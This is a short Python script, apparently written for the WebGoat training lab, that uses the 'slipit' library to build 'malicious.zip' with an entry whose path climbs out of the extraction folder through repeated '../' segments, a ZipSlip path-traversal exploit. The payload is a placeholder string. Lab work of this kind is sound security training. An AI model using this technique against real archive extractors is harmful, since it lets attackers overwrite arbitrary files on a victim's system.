from slipit.provider.zip_provider import ZipProvider

# Create a SlipIt instance
archive_name = 'malicious.zip'
s = ZipProvider.create(archive_name)

# Define the content you want to place in the ZIP archive
malicious_content = b'Your malicious content goes here'

# Define the path inside the ZIP archive to exploit ZipSlip
exploit_path = '../../../../../../../../../home/webgoat/.webgoat-2023.4/PathTraversal/jarand/jarand.jpg'

# Add the malicious content to the ZIP archive with the exploit path
s.append_blob(malicious_content, exploit_path)

# Close the ZIP archive
s.close_archive()
